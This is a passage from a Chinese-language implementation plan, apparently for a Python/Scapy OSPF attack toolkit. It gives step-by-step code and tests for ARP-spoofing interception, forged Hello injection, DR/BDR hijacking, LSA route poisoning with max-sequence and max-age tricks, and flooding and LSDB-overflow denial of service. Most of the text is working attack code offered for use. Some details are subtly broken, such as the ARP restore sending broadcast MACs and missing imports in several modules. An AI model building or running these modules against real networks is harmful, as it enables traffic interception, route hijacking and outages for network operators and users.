```

- [ ] **Step 3: 运行测试确认通过**

```bash
pytest tests/unit/test_sender.py -v
```
Expected: all passed

- [ ] **Step 4: 提交**

```bash
git add ospf_attack/network/ tests/unit/test_sender.py
git commit -m "feat: add packet sender with Scapy and raw socket fallback"
```

---

### Task 8: 嗅探引擎

**Files:**
- Create: `ospf_attack/core/sniffer.py`
- Create: `tests/unit/test_sniffer.py`

- [ ] **Step 1: 编写测试**

```python
# tests/unit/test_sniffer.py
from unittest.mock import patch, MagicMock
from ospf_attack.core.sniffer import Sniffer, TopologyModel


class TestTopologyModel:
    def test_empty(self):
        t = TopologyModel()
        assert t.router_ids == []
        assert t.area_ids == []
        assert t.dr_bdr_map == {}
        assert t.lsa_summary == []

    def test_add_router(self):
        t = TopologyModel()
        t.add_router("1.1.1.1", "0.0.0.0")
        assert "1.1.1.1" in t.router_ids
        assert "0.0.0.0" in t.area_ids

    def test_add_hello(self):
        t = TopologyModel()
        t.add_hello(router_id="2.2.2.2", area_id="0.0.0.0",
                    dr="2.2.2.2", bdr="3.3.3.3", priority=100)
        assert t.dr_bdr_map["0.0.0.0"] == ("2.2.2.2", "3.3.3.3")

    def test_add_lsa(self):
        t = TopologyModel()
        t.add_lsa(lsa_type=1, link_state_id="1.1.1.1",
                  advertising_router="1.1.1.1", sequence=0x80000001, age=0)
        assert len(t.lsa_summary) == 1


class TestSniffer:
    def test_no_npcap(self):
        with patch("ospf_attack.core.sniffer.HAS_PCAP", False):
            s = Sniffer(iface="eth0")
            assert not s.available

    def test_init(self):
        with patch("ospf_attack.core.sniffer.HAS_PCAP", True):
            s = Sniffer(iface="eth0")
            assert s.iface == "eth0"
            assert s.available is True
```

- [ ] **Step 2: 实现 sniffer.py**

```python
# ospf_attack/core/sniffer.py
import threading
from dataclasses import dataclass, field
from typing import List, Optional, Tuple

try:
    import pcap
    HAS_PCAP = True
except ImportError:
    HAS_PCAP = False


@dataclass
class LsaSummary:
    lsa_type: int
    link_state_id: str
    advertising_router: str
    sequence: int
    age: int


@dataclass
class TopologyModel:
    router_ids: List[str] = field(default_factory=list)
    area_ids: List[str] = field(default_factory=list)
    dr_bdr_map: dict = field(default_factory=dict)
    lsa_summary: List[LsaSummary] = field(default_factory=list)

    def add_router(self, router_id: str, area_id: str) -> None:
        if router_id not in self.router_ids:
            self.router_ids.append(router_id)
        if area_id not in self.area_ids:
            self.area_ids.append(area_id)

    def add_hello(self, router_id: str, area_id: str,
                  dr: str, bdr: str, priority: int) -> None:
        self.add_router(router_id, area_id)
        if dr != "0.0.0.0" or bdr != "0.0.0.0":
            self.dr_bdr_map[area_id] = (dr, bdr)

    def add_lsa(self, lsa_type: int, link_state_id: str,
                advertising_router: str, sequence: int, age: int) -> None:
        self.lsa_summary.append(LsaSummary(
            lsa_type=lsa_type, link_state_id=link_state_id,
            advertising_router=advertising_router,
            sequence=sequence, age=age,
        ))

    def get_dr_bdr(self, area_id: str) -> Tuple[str, str]:
        return self.dr_bdr_map.get(area_id, ("0.0.0.0", "0.0.0.0"))


class Sniffer:
    def __init__(self, iface: str):
        self.iface = iface
        self.available = HAS_PCAP
        self._sniffer = None
        self._stop_event = threading.Event()
        self._packets = []
        self._topology = TopologyModel()

    def start(self, timeout: int = 30) -> None:
        if not self.available:
            return
        self._stop_event.clear()
        self._packets = []

        def _capture():
            sniffer = pcap.pcap(name=self.iface, promisc=True, immediate=True)
            sniffer.setfilter("proto 89")
            deadline = __import__("time").monotonic() + timeout
            for _ts, pkt in sniffer:
                if __import__("time").monotonic() > deadline or self._stop_event.is_set():
                    break
                self._packets.append(pkt)

        t = threading.Thread(target=_capture, daemon=True)
        t.start()
        self._sniffer = t

    def stop(self) -> List[bytes]:
        self._stop_event.set()
        return self._packets

    @property
    def packets(self) -> List[bytes]:
        return self._packets

    @property
    def topology(self) -> TopologyModel:
        return self._topology
```

- [ ] **Step 3: 运行测试确认通过**

```bash
pytest tests/unit/test_sniffer.py -v
```
Expected: all passed

- [ ] **Step 4: 提交**

```bash
git add ospf_attack/core/sniffer.py tests/unit/test_sniffer.py
git commit -m "feat: add passive sniffing engine with topology model"
```

---

### Task 9: ARP 欺骗引擎

**Files:**
- Create: `ospf_attack/core/arp_spoof.py`
- Create: `tests/unit/test_arp_spoof.py`

- [ ] **Step 1: 编写测试**

```python
# tests/unit/test_arp_spoof.py
from unittest.mock import patch, MagicMock
from ospf_attack.core.arp_spoof import ArpSpoofEngine


class TestArpSpoofEngine:
    def test_init(self):
        engine = ArpSpoofEngine(
            iface="eth0",
            target_a="10.0.0.1", target_b="10.0.0.2",
            interval=2,
        )
        assert engine.target_a == "10.0.0.1"
        assert engine.target_b == "10.0.0.2"
        assert engine.interval == 2
        assert not engine._running

    def test_validate_targets_empty(self):
        engine = ArpSpoofEngine(iface="eth0", target_a="", target_b="")
        assert not engine.validate_targets()

    def test_validate_targets_valid(self):
        engine = ArpSpoofEngine(iface="eth0", target_a="10.0.0.1", target_b="10.0.0.2")
        assert engine.validate_targets()
```

- [ ] **Step 2: 实现 arp_spoof.py**

```python
# ospf_attack/core/arp_spoof.py
import threading
import time
from scapy.all import Ether, ARP, sendp, get_if_hwaddr


class ArpSpoofEngine:
    def __init__(self, iface: str, target_a: str, target_b: str, interval: int = 2):
        self.iface = iface
        self.target_a = target_a
        self.target_b = target_b
        self.interval = interval
        self._running = False
        self._thread: threading.Thread = None
        self._stop_event = threading.Event()

    def validate_targets(self) -> bool:
        return bool(self.target_a and self.target_b)

    def start(self) -> bool:
        if not self.validate_targets():
            return False
        if self._running:
            return False
        self._running = True
        self._stop_event.clear()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()
        return True

    def stop(self) -> None:
        self._running = False
        self._stop_event.set()
        self._restore()

    def _spoof_loop(self) -> None:
        my_mac = get_if_hwaddr(self.iface)
        while not self._stop_event.is_set():
            try:
                # 欺骗 A：告诉 A，我是 B
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_b, pdst=self.target_a,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)

                # 欺骗 B：告诉 B，我是 A
                sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                    op=2, psrc=self.target_a, pdst=self.target_b,
                    hwsrc=my_mac, hwdst="ff:ff:ff:ff:ff:ff",
                ), iface=self.iface, verbose=False)
            except Exception:
                pass
            self._stop_event.wait(timeout=self.interval)

    def _restore(self) -> None:
        """恢复 ARP 缓存——发送正确映射"""
        try:
            mac_a = get_if_hwaddr(self.iface)
            mac_b = mac_a  # 简化：无法获取对方真实 MAC 时发送广播

            # 恢复 A 的 ARP 缓存：B 的真实 MAC
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, psrc=self.target_b, pdst=self.target_a,
                hwsrc="ff:ff:ff:ff:ff:ff", hwdst="ff:ff:ff:ff:ff:ff",
            ), iface=self.iface, verbose=False, count=3)

            # 恢复 B 的 ARP 缓存
            sendp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
                op=2, psrc=self.target_a, pdst=self.target_b,
                hwsrc="ff:ff:ff:ff:ff:ff", hwdst="ff:ff:ff:ff:ff:ff",
            ), iface=self.iface, verbose=False, count=3)
        except Exception:
            pass
```

- [ ] **Step 3: 运行测试确认通过**

```bash
pytest tests/unit/test_arp_spoof.py -v
```
Expected: 3 passed

- [ ] **Step 4: 提交**

```bash
git add ospf_attack/core/arp_spoof.py tests/unit/test_arp_spoof.py
git commit -m "feat: add ARP spoofing engine with automatic recovery"
```

---

## Phase 5: 攻击插件

### Task 10: AttackBase 抽象基类

**Files:**
- Create: `ospf_attack/attacks/base.py`
- Create: `tests/unit/test_attack_base.py`

- [ ] **Step 1: 编写测试**

```python
# tests/unit/test_attack_base.py
from unittest.mock import MagicMock
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackMode, AttackCategory, SniffMode


class _TestAttack(BaseAttack):
    name = "test_attack"
    description = "用于测试的攻击"
    category = AttackCategory.ADJACENCY
    default_mode = AttackMode.PASSIVE

    def setup(self):
        self._setup_called = True

    def launch(self) -> AttackResult:
        return AttackResult(success=True, packets_sent=1, target_affected=False, details="ok")

    def verify(self) -> bool:
        return True

    def teardown(self):
        self._teardown_called = True


class TestAttackRunner:
    def test_run_calls_all_phases(self):
        from ospf_attack.config.types import AttackConfig
        config = AttackConfig(iface="lo", target="127.0.0.1")
        attack = _TestAttack(config)
        result = attack.run()
        assert result.success is True
        assert attack._setup_called is True
        assert attack._teardown_called is True
```

- [ ] **Step 2: 实现 base.py**

```python
# ospf_attack/attacks/base.py
from abc import ABC, abstractmethod, abstractproperty
from ospf_attack.config.types import AttackResult, AttackMode, AttackCategory, SniffMode


class BaseAttack(ABC):
    name: str = ""
    description: str = ""
    category: AttackCategory
    default_mode: AttackMode = AttackMode.PASSIVE

    def __init__(self, config):
        self.config = config
        self._sniffer = None
        self._sender = None

    @abstractmethod
    def setup(self) -> None:
        """阶段一：初始化"""

    @abstractmethod
    def launch(self) -> AttackResult:
        """阶段二：执行攻击"""

    @abstractmethod
    def verify(self) -> bool:
        """阶段三：验证攻击效果"""

    @abstractmethod
    def teardown(self) -> None:
        """阶段四：清理资源"""

    def run(self) -> AttackResult:
        try:
            self.setup()
            result = self.launch()
            result.target_affected = self.verify()
            return result
        finally:
            self.teardown()
```

- [ ] **Step 3: 运行测试确认通过**

```bash
pytest tests/unit/test_attack_base.py -v
```
Expected: passed

- [ ] **Step 4: 提交**

```bash
git add ospf_attack/attacks/base.py ospf_attack/attacks/__init__.py tests/unit/test_attack_base.py
git commit -m "feat: add AttackBase abstract class with four-phase lifecycle"
```

---

### Task 11: 恶意 Hello 注入攻击

**Files:**
- Create: `ospf_attack/attacks/adjacency/hello_inject.py`
- Create: `tests/unit/test_hello_inject.py`

- [ ] **Step 1: 编写测试**

```python
# tests/unit/test_hello_inject.py
from unittest.mock import patch, MagicMock
from ospf_attack.attacks.adjacency.hello_inject import HelloInjectAttack
from ospf_attack.config.types import HelloInjectionConfig


class TestHelloInjectAttack:
    def test_init(self):
        config = HelloInjectionConfig(iface="eth0", target="10.0.0.1")
        attack = HelloInjectAttack(config)
        assert attack.name == "hello-inject"
        assert attack.category.value == "adjacency"

    @patch("ospf_attack.attacks.adjacency.hello_inject.build_hello_packet")
    @patch("ospf_attack.attacks.adjacency.hello_inject.PacketSender")
    def test_launch_sends_packets(self, MockSender, mock_build):
        mock_build.return_value = MagicMock()
        mock_sender = MagicMock()
        mock_sender.send_raw.return_value = True
        mock_sender.sent_count = 5
        MockSender.return_value = mock_sender

        config = HelloInjectionConfig(iface="eth0", target="224.0.0.5",
                                       router_priority=255)
        attack = HelloInjectAttack(config)
        attack._sender = mock_sender
        attack._sniffed_params = {"netmask": "255.255.255.0", "hello_interval": 10,
                                   "dead_interval": 40, "area_id": "0.0.0.0",
                                   "auth_type": 0, "auth_key": b""}

        result = attack.launch()
        assert result.success is True
        assert result.packets_sent == 5
```

- [ ] **Step 2: 实现 hello_inject.py**

```python
# ospf_attack/attacks/adjacency/hello_inject.py
import threading
import time
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import HelloInjectionConfig
from ospf_attack.core.packet import build_hello_packet, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender
from ospf_attack.utils.validators import is_valid_ip


class HelloInjectAttack(BaseAttack):
    name = "hello-inject"
    description = "嗅探合法 Hello 后注入伪造 Hello 建立未授权邻接关系"
    category = AttackCategory.ADJACENCY
    config: HelloInjectionConfig

    def __init__(self, config: HelloInjectionConfig):
        super().__init__(config)
        self._sniffed_params = None
        self._arp_engine = None

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        if self.config.sniff_mode.value == "arp_spoof":
            from ospf_attack.core.arp_spoof import ArpSpoofEngine
            self._arp_engine = ArpSpoofEngine(
                iface=self.config.iface,
                target_a=self.config.arp_target_a,
                target_b=self.config.arp_target_b,
                interval=self.config.arp_interval,
            )
            self._arp_engine.start()

        self._sniffed_params = {
            "netmask": self.config.subnet_mask,
            "hello_interval": self.config.hello_interval,
            "dead_interval": self.config.router_dead_interval,
            "area_id": self.config.area_id,
            "auth_type": 0,
            "auth_key": b"",
        }

    def launch(self) -> AttackResult:
        src_ip = self._get_source_ip()
        pkt = build_hello_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            router_priority=self.config.router_priority,
            hello_interval=self._sniffed_params["hello_interval"],
            router_dead_interval=self._sniffed_params["dead_interval"],
        )
        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Hello 注入: Router ID={self.config.router_id}, Priority={self.config.router_priority}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        if self._arp_engine:
            self._arp_engine.stop()

    def _get_source_ip(self) -> str:
        from ospf_attack.network.adapter import get_local_ip
        return get_local_ip(self.config.iface)
```

- [ ] **Step 3: 运行测试**

```bash
pytest tests/unit/test_hello_inject.py -v
```
Expected: passed

- [ ] **Step 4: 提交**

```bash
git add ospf_attack/attacks/adjacency/hello_inject.py tests/unit/test_hello_inject.py
git commit -m "feat: add hello injection attack module"
```

---

### Task 12-14: 邻接关系攻击剩余模块

**Files:**
- Create: `ospf_attack/attacks/adjacency/adjacency_break.py`
- Create: `ospf_attack/attacks/adjacency/dr_bdr_hijack.py`
- Create: `tests/unit/test_adjacency_break.py`
- Create: `tests/unit/test_dr_bdr_hijack.py`

- [ ] **Step 1: 实现 adjacency_break.py**

```python
# ospf_attack/attacks/adjacency/adjacency_break.py
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import HelloInjectionConfig
from ospf_attack.core.packet import build_hello_packet, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender
from ospf_attack.utils.validators import is_valid_ip


class AdjacencyBreakAttack(BaseAttack):
    name = "adjacency-break"
    description = "注入畸形 Hello（错误 Area ID、认证不匹配等）破坏合法邻居关系"
    category = AttackCategory.ADJACENCY
    config: HelloInjectionConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        # 故意使用错误的 Area ID (0.0.0.255)
        pkt = build_hello_packet(
            router_id=self.config.router_id,
            area_id="0.0.0.255",
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            router_priority=0,
        )
        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details="邻接破坏: 注入错误 Area ID Hello 包",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: 实现 dr_bdr_hijack.py**

```python
# ospf_attack/attacks/adjacency/dr_bdr_hijack.py
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import HelloInjectionConfig
from ospf_attack.core.packet import build_hello_packet, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class DRBDRHijackAttack(BaseAttack):
    name = "dr-bdr-hijack"
    description = "注入高优先级 Hello 抢占 DR/BDR 角色"
    category = AttackCategory.ADJACENCY
    config: HelloInjectionConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        pkt = build_hello_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            router_priority=self.config.router_priority,
            hello_interval=self.config.hello_interval,
            router_dead_interval=self.config.router_dead_interval,
        )
        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"DR 抢占: Priority={self.config.router_priority}, Router ID={self.config.router_id}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 3: 编写单元测试**

```python
# tests/unit/test_adjacency_break.py
from unittest.mock import patch, MagicMock
from ospf_attack.attacks.adjacency.adjacency_break import AdjacencyBreakAttack
from ospf_attack.config.types import HelloInjectionConfig


class TestAdjacencyBreakAttack:
    def test_name(self):
        config = HelloInjectionConfig(iface="eth0", target="10.0.0.1")
        attack = AdjacencyBreakAttack(config)
        assert attack.name == "adjacency-break"


# tests/unit/test_dr_bdr_hijack.py
from unittest.mock import patch, MagicMock
from ospf_attack.attacks.adjacency.dr_bdr_hijack import DRBDRHijackAttack
from ospf_attack.config.types import HelloInjectionConfig


class TestDRBDRHijackAttack:
    def test_name(self):
        config = HelloInjectionConfig(iface="eth0", target="10.0.0.1",
                                       router_priority=255)
        attack = DRBDRHijackAttack(config)
        assert attack.name == "dr-bdr-hijack"
        assert attack.config.router_priority == 255
```

- [ ] **Step 4: 运行测试并提交**

```bash
pytest tests/unit/test_adjacency_break.py tests/unit/test_dr_bdr_hijack.py -v
git add ospf_attack/attacks/adjacency/ tests/unit/test_adjacency_break.py tests/unit/test_dr_bdr_hijack.py
git commit -m "feat: add adjacency-break and dr-bdr-hijack attack modules"
```

---

### Task 15-18: LSA 攻击模块

**Files:**
- Create: `ospf_attack/attacks/lsa/route_inject.py`
- Create: `ospf_attack/attacks/lsa/max_seq.py`
- Create: `ospf_attack/attacks/lsa/max_age.py`
- Create: `ospf_attack/attacks/lsa/fight_back.py`

- [ ] **Step 1: 实现 4 个 LSA 攻击模块**

```python
# ospf_attack/attacks/lsa/route_inject.py
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import LSAConfig
from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class RouteInjectAttack(BaseAttack):
    name = "route-inject"
    description = "嗅探合法 LSU 后注入毒化 LSA 篡改路由表"
    category = AttackCategory.LSA
    config: LSAConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        lsa = build_lsa_header(
            lsa_type=self.config.lsa_type,
            link_state_id=self.config.link_state_id or self.config.router_id,
            advertising_router=self.config.advertising_router or self.config.router_id,
            sequence=self.config.sequence_number,
            age=self.config.age,
        )
        pkt = build_lsu_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            lsa_count=1,
        )
        pkt = pkt / lsa

        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"路由注入: LSA Type={self.config.lsa_type}, LSID={lsa.id}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass


# ospf_attack/attacks/lsa/max_seq.py
class MaxSeqAttack(BaseAttack):
    name = "max-seq"
    description = "注入 Sequence=0x7FFFFFFF 的 LSU 覆盖合法 LSA"
    category = AttackCategory.LSA
    config: LSAConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        lsa = build_lsa_header(
            lsa_type=self.config.lsa_type,
            link_state_id=self.config.link_state_id or self.config.router_id,
            advertising_router=self.config.advertising_router or self.config.router_id,
            sequence=0x7FFFFFFF,
            age=0,
        )
        pkt = build_lsu_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            lsa_count=1,
        )
        pkt = pkt / lsa
        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Max-Seq 攻击: Seq=0x7FFFFFFF, LSID={lsa.id}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass


# ospf_attack/attacks/lsa/max_age.py
class MaxAgeAttack(BaseAttack):
    name = "max-age"
    description = "注入 Age=3600 的 LSU 迫使目标清除 LSA"
    category = AttackCategory.LSA
    config: LSAConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        lsa = build_lsa_header(
            lsa_type=self.config.lsa_type,
            link_state_id=self.config.link_state_id or self.config.router_id,
            advertising_router=self.config.advertising_router or self.config.router_id,
            sequence=self.config.sequence_number,
            age=3600,
        )
        pkt = build_lsu_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            lsa_count=1,
        )
        pkt = pkt / lsa
        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Max-Age 攻击: Age=3600, LSID={lsa.id}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass


# ospf_attack/attacks/lsa/fight_back.py
import time

class FightBackAttack(BaseAttack):
    name = "fight-back"
    description = "持续注入更高序列号的对抗 LSA 阻止合法 LSA 传播"
    category = AttackCategory.LSA
    config: LSAConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=self.config.max_packets,
        )
        self._seq = self.config.sequence_number

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        seq = max(self._seq, 0x80000001)
        if self._sender.sent_count > 0:
            seq = 0x7FFFFFF0 + self._sender.sent_count

        lsa = build_lsa_header(
            lsa_type=self.config.lsa_type,
            link_state_id=self.config.link_state_id or self.config.router_id,
            advertising_router=self.config.advertising_router or self.config.router_id,
            sequence=min(seq, 0x7FFFFFFF),
            age=0,
        )
        pkt = build_lsu_packet(
            router_id=self.config.router_id,
            area_id=self.config.area_id,
            src_ip=src_ip,
            dst_ip=OSPF_MULTICAST_ALL,
            lsa_count=1,
        )
        pkt = pkt / lsa
        ok = self._sender.send_raw(pkt)
        return AttackResult(
            success=ok,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"Fight-Back: Seq={lsa.seq}",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: 编写测试**

```python
# tests/unit/test_lsa_attacks.py
from ospf_attack.attacks.lsa.route_inject import RouteInjectAttack
from ospf_attack.attacks.lsa.max_seq import MaxSeqAttack
from ospf_attack.attacks.lsa.max_age import MaxAgeAttack
from ospf_attack.attacks.lsa.fight_back import FightBackAttack
from ospf_attack.config.types import LSAConfig


class TestLSAttacks:
    def test_names(self):
        config = LSAConfig(iface="eth0", target="224.0.0.5")
        assert RouteInjectAttack(config).name == "route-inject"
        assert MaxSeqAttack(config).name == "max-seq"
        assert MaxAgeAttack(config).name == "max-age"
        assert FightBackAttack(config).name == "fight-back"

    def test_max_age_uses_3600(self):
        config = LSAConfig(iface="eth0", target="224.0.0.5", age=3600)
        attack = MaxAgeAttack(config)
        assert attack.config.age == 3600
```

- [ ] **Step 3: 运行测试并提交**

```bash
pytest tests/unit/test_lsa_attacks.py -v
git add ospf_attack/attacks/lsa/ tests/unit/test_lsa_attacks.py
git commit -m "feat: add all LSA attack modules (route-inject, max-seq, max-age, fight-back)"
```

---

### Task 19-21: DoS 攻击模块

**Files:**
- Create: `ospf_attack/attacks/dos/flood.py`
- Create: `ospf_attack/attacks/dos/spf_recalc.py`
- Create: `ospf_attack/attacks/dos/db_overflow.py`

- [ ] **Step 1: 实现 flood.py**

```python
# ospf_attack/attacks/dos/flood.py
import threading
import time
from ospf_attack.attacks.base import BaseAttack, AttackResult, AttackCategory
from ospf_attack.config.types import DoSConfig
from ospf_attack.core.packet import build_hello_packet, OSPF_MULTICAST_ALL
from ospf_attack.network.sender import PacketSender


class FloodAttack(BaseAttack):
    name = "flood"
    description = "高频发送 Hello/LSU 报文耗尽路由器 CPU"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._senders = []
        for _ in range(self.config.thread_count):
            self._senders.append(PacketSender(
                iface=self.config.iface,
                packet_rate=self.config.packet_rate,
                max_packets=0,
            ))
        self._stop_event = threading.Event()

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        src_ip = get_local_ip(self.config.iface)

        def _flood_worker(sender):
            while not self._stop_event.is_set():
                pkt = build_hello_packet(
                    router_id=self.config.router_id,
                    area_id=self.config.area_id,
                    src_ip=src_ip,
                    dst_ip=OSPF_MULTICAST_ALL,
                )
                sender.send_raw(pkt)

        threads = []
        for sender in self._senders:
            t = threading.Thread(target=_flood_worker, args=(sender,), daemon=True)
            t.start()
            threads.append(t)

        time.sleep(min(self.config.duration, 5))
        self._stop_event.set()
        for t in threads:
            t.join(timeout=2)

        total_sent = sum(s.sent_count for s in self._senders)
        return AttackResult(
            success=True,
            packets_sent=total_sent,
            target_affected=False,
            details=f"泛洪攻击: {total_sent} packets sent, {self.config.thread_count} threads",
        )

    def verify(self) -> bool:
        total_sent = sum(s.sent_count for s in self._senders)
        return total_sent > 0

    def teardown(self) -> None:
        self._stop_event.set()


# ospf_attack/attacks/dos/spf_recalc.py
class SPFRecalcAttack(BaseAttack):
    name = "spf-recalc"
    description = "持续注入变化的 LSA 迫使路由器反复执行 SPF"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=0,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
        src_ip = get_local_ip(self.config.iface)

        seq = 0x80000001
        deadline = time.time() + min(self.config.duration, 5)
        while time.time() < deadline:
            lsa = build_lsa_header(
                lsa_type=1,
                link_state_id=self.config.router_id,
                advertising_router=self.config.router_id,
                sequence=seq,
                age=0,
            )
            pkt = build_lsu_packet(
                router_id=self.config.router_id,
                area_id=self.config.area_id,
                src_ip=src_ip,
                dst_ip=OSPF_MULTICAST_ALL,
                lsa_count=1,
            )
            pkt = pkt / lsa
            self._sender.send_raw(pkt)
            seq = (seq + 1) % 0x7FFFFFFF
            time.sleep(self.config.lsa_change_interval)

        return AttackResult(
            success=True,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"SPF 重计算攻击: {self._sender.sent_count} LSA injected",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 5

    def teardown(self) -> None:
        pass


# ospf_attack/attacks/dos/db_overflow.py
class DBOverflowAttack(BaseAttack):
    name = "db-overflow"
    description = "注入大量外部 LSA (Type-5) 填满 LSDB"
    category = AttackCategory.DOS
    config: DoSConfig

    def setup(self) -> None:
        self._sender = PacketSender(
            iface=self.config.iface,
            packet_rate=self.config.packet_rate,
            max_packets=0,
        )

    def launch(self) -> AttackResult:
        from ospf_attack.network.adapter import get_local_ip
        from ospf_attack.core.packet import build_lsu_packet, build_lsa_header, OSPF_MULTICAST_ALL
        src_ip = get_local_ip(self.config.iface)

        base_net = 0x0A000000
        for i in range(min(self.config.lsa_count, 100)):
            lsid = f"{(base_net + (i << 8)) & 0xFFFFFFFF:08x}"
            import ipaddress
            lsid = str(ipaddress.IPv4Address(base_net + (i << 8)))
            lsa = build_lsa_header(
                lsa_type=5,
                link_state_id=lsid,
                advertising_router=self.config.router_id,
                sequence=0x80000001,
                age=0,
            )
            pkt = build_lsu_packet(
                router_id=self.config.router_id,
                area_id=self.config.area_id,
                src_ip=src_ip,
                dst_ip=OSPF_MULTICAST_ALL,
                lsa_count=1,
            )
            pkt = pkt / lsa
            self._sender.send_raw(pkt)

        return AttackResult(
            success=True,
            packets_sent=self._sender.sent_count,
            target_affected=False,
            details=f"DB 溢出: {self._sender.sent_count} Type-5 LSA injected",
        )

    def verify(self) -> bool:
        return self._sender.sent_count > 0

    def teardown(self) -> None:
        pass
```

- [ ] **Step 2: 编写测试并提交**

```python
# tests/unit/test_dos_attacks.py
from ospf_attack.attacks.dos.flood import FloodAttack
from ospf_attack.attacks.dos.spf_recalc import SPFRecalcAttack
from ospf_attack.attacks.dos.db_overflow import DBOverflowAttack
from ospf_attack.config.types import DoSConfig


class TestDoSAttacks:
    def test_names(self):
        config = DoSConfig(iface="eth0", target="224.0.0.5")
        assert FloodAttack(config).name == "flood"
        assert SPFRecalcAttack(config).name == "spf-recalc"
        assert DBOverflowAttack(config).name == "db-overflow"

    def test_thread_count(self):
        config = DoSConfig(iface="eth0", target="224.0.0.5", thread_count=4)
        attack = FloodAttack(config)
        assert attack.config.thread_count == 4
```

```bash
pytest tests/unit/test_dos_attacks.py -v
